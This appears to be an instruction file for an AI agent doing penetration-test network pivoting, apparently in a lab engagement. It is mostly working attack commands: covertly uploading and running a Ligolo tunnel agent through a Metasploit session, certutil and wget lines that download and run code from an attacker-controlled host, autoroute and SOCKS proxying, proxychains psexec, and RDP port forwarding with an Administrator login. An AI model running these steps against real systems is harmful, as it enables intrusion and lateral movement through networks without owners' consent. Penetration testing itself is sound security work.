Set up a network pivot for a new subnet or compromised host. $ARGUMENTS = new subnet CIDR and/or the Metasploit session id on the pivot host.

Two methods — Ligolo-ng (preferred, creates a TUN interface, no proxychains) and Metasploit route+SOCKS (fallback when the Ligolo agent can't be deployed). Both go THROUGH a Metasploit session (see CLAUDE.md "Foothold sequence" — the session comes from the raw shell). If a step fails, hand it to Kapi — do not loop. After ANY tunnel, re-assert the HexStrike loopback firewall rule (`/osai-engage` Step 5).

---

## METHOD A: Ligolo-ng (preferred — no proxychains needed)

### A1: Deliver the Ligolo agent THROUGH the Metasploit session
Serve the agent from the Kali HTTP server (port 8000), then from the session download & run it.

**Windows (meterpreter):**
```
meterpreter > upload ~/osai/tools/ligolo/agent.exe C:\\Windows\\Temp\\lga.exe
meterpreter > execute -H -f C:\\Windows\\Temp\\lga.exe -a "-connect KALI_IP:11601 -ignore-cert"
# shell fallback: certutil -urlcache -split -f http://KALI_IP:8000/agent.exe C:\Windows\Temp\lga.exe
```
**Linux (shell/meterpreter):**
```
wget http://KALI_IP:8000/agent -O /tmp/lga && chmod +x /tmp/lga && /tmp/lga -connect KALI_IP:11601 -ignore-cert &
```

### A2: Activate tunnel in the Ligolo console (Kali)
```
ligolo-ng >> session    <- select the new agent
ligolo-ng >> start      <- activate TUN interface (tun0 / ligolo)
```

### A3: Add route on Kali for the new subnet
```bash
sudo ip route add <NEW_SUBNET> dev ligolo
ip route | grep ligolo ; ping -c 2 <INTERNAL_IP>
```

### A4: Double pivot (through the first agent)
```
# Ligolo console on the FIRST session:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11602
# Second host connects to the FIRST pivot host's IP:11601 (deliver via that host's MSF session)
sudo ip route add <SECOND_SUBNET> dev ligolo
```

---

## METHOD B: Metasploit route + SOCKS (fallback — needs proxychains)

```
# In the session's meterpreter, add a route through it:
meterpreter > run autoroute -s <NEW_SUBNET>
# or, module form:
msf > use post/multi/manage/autoroute
msf > set SESSION <id> ; set SUBNET <NEW_SUBNET> ; run

# Stand up a SOCKS proxy on Kali that uses those routes:
msf > use auxiliary/server/socks_proxy
msf > set SRVHOST 127.0.0.1 ; set SRVPORT 1080 ; set VERSION 5 ; run -j
```
Add to `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`
```bash
proxychains4 nmap -sT -Pn <INTERNAL_IP>
proxychains4 impacket-psexec DOMAIN/user@INTERNAL_IP
```

## METHOD C: Port forward via the session (one specific service)
```
meterpreter > portfwd add -l 13389 -p 3389 -r 10.10.10.5
```
Then: `xfreerdp3 /v:127.0.0.1:13389 /u:Administrator /p:password`

---

## Step: Update tunnel map
Append to ~/osai/current/state/tunnel_map.md:
```markdown
| Method | Session/Host | New Subnet | Command | Time |
|--------|-------------|------------|---------|------|
| Ligolo | <HOST> | <SUBNET> | sudo ip route add <SUBNET> dev ligolo | <TIME> |
| MSF-SOCKS | <SESSION> | <SUBNET> | socks5 127.0.0.1:1080 | <TIME> |
```

## Step: Record the new host in msfdb (via the `metasploit` MCP)
```
msf > hosts -a <IP>          # tracked in the lab workspace
```

## Verification checklist
- [ ] `ip route | grep ligolo` shows the new subnet (Ligolo method)
- [ ] OR the `socks_proxy` job is running (MSF method)
- [ ] Can reach an internal IP through the pivot
- [ ] `tunnel_map.md` updated ; host recorded in msfdb
- [ ] HexStrike loopback firewall rule re-asserted after the tunnel
